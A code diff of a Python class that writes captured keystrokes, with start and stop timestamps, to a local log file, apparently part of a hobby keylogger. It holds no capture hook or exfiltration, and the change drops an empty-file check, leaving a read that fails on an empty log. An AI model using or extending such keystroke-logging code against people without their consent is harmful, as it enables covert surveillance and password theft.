@@ -21,26 +21,18 @@ class write_Read :
                     
         with open("./Logs/log.txt", "r") as r:
             
-            #checks to see if the file isn't empty
-            if os.path.getsize("./Logs/log.txt") == 0:
-                
-                    noSpace = True
+            last_Character = r.read()[-1]
+            if last_Character == ' ':
+                noSpace = True
             else:
-                last_Character = r.read()[-1]
-                if last_Character == ' ':
-                    noSpace = True
-                else:
-                    pass
+                pass
 
         return noSpace
 
     # writes to the file log.txt for each captured key
-    def write_file(self,key, Key):
+    def write_file(self,k, Key):
 
-        with open("./Logs/log.txt", "w") as f:
-
-            # removes the quotation marks from being captured
-            k = str(key).replace("'", "")
+        with open("./Logs/log.txt", "a") as f:
 
             # removes the word space
             if k == str(Key.space):
@@ -49,6 +41,9 @@ class write_Read :
                     pass
                 else:
                     f.write(' ')
+            elif k == "\n":
+                f.write(f"{k}\t")
+                print()
             else:
                 if k.find("Key") == -1:
                     f.write(k)
@@ -61,14 +56,17 @@ class write_Read :
         if isEmpty:
             with open("./Logs/log.txt", "w") as time:
                 time.write(f"Began typing at {format(beginning)}\n")
+                time.write(f"``````````````````````````````````````````````````````````````````\n")
         else:
             with open("./Logs/log.txt", "a") as time:
                 time.write(f"Began typing at {format(beginning)}\n")
+                time.write(f"``````````````````````````````````````````````````````````````````\n")
         
 
     # writes the time captured at the end
     def time_end(self,end):
         with open("./Logs/log.txt", "a") as time:
+            time.write(f"\n``````````````````````````````````````````````````````````````````")
             time.write(f"\nStopped typing at {format(end)}\n")
             time.write("************************************************************\n\n")
 
